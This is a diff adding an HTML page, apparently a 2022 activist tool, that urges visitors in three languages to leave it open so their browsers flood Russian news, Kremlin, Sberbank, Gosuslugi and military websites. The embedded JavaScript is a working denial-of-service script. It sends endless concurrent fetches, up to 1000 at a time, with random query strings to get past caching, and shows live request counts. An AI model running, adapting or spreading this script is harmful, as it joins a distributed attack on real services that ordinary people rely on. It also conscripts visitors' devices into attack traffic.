@@ -1,0 +1,184 @@
+<html>
+    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Russia HTML DoS</title>
+</head>
+<body>
+        <p>Reformated from https://stop-russian-desinformation.near.page</p>
+  <h1>Russia HTML DoS</h1>
+  <h3>English version</h3>
+  <p>For security concerns, you are able to simply save the webpage, and run locally - as well as view the source.  It is entirely HTML and browser interpreted.</p>
+  <p>The "official" news in russian federation are all fake and we believe it is better to shut them down!</p>
+  <p>Please, just open this page and let it be open on your devices, it will flood the web-sites and pose a huge load on their infrastructure</p>
+  <h3>Русская версия</h3>
+  <p>"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
+  <p>Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она будет автоматически нагружать сайты российской пропаганды.</p>
+  <h3>Українська версія</h3>
+  <p>Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
+  <p>Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично навантажувала сайти російської пропаганди.</p>
+  <h3>Here is the stats of your session (the links and the number of the requests that were sent from your browser):</h3>
+  <h3>Failed to fetch is normal - if any site has that - that means their servers are under load and are dropping packets - which is the goal!</h3>
+  <div id="stats"><pre>{
+  "https://lenta.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://ria.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://ria.ru/lenta/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://www.rbc.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://www.rt.com/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "http://kremlin.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "http://en.kremlin.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://smotrim.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://tass.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://tvzvezda.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://vsoloviev.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://www.1tv.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://www.vesti.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://online.sberbank.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+  "https://sberbank.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },  
+  "https://www.gosuslugi.ru/": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  },
+    "https://mil.ru": {
+    "number_of_requests": 0,
+    "number_of_errored_responses": 0,
+    "error_message": "Failed to fetch"
+  }
+}</pre></div>
+  <div id="errors"></div>
+  <p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine conflict: Russian forces attack from three sides</a></p>
+
+<script>
+var targets = {
+  'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://mil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
+}
+
+var statsEl = document.getElementById('stats');
+function printStats() {
+  statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
+}
+setInterval(printStats, 1000);
+
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+
+async function fetchWithTimeout(resource, options) {
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), options.timeout);
+  return fetch(resource, {
+    signal: controller.signal
+  }).then((response) => {
+    clearTimeout(id);
+    return response;
+  }).catch((error) => {
+    clearTimeout(id);
+    throw error;
+  });
+}
+
+async function flood(target) {
+  for (var i = 0;; ++i) {
+    if (queue.length > CONCURRENCY_LIMIT) {
+      await queue.shift()
+    }
+    rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
+    queue.push(
+      fetchWithTimeout(target+rand, { timeout: 1000 })
+        .catch((error) => {
+          if (error.code === 20 /* ABORT */) {
+            return;
+          }
+          targets[target].number_of_errored_responses++;
+          targets[target].error_message = error.message
+        })
+        .then((response) => {
+          if (response && !response.ok) {
+            targets[target].number_of_errored_responses++;
+            targets[target].error_message = response.statusText
+          }
+          targets[target].number_of_requests++;
+        })
+
+    )
+  }
+}
+
+// Start
+Object.keys(targets).map(flood)
+</script>
+    </body></html>
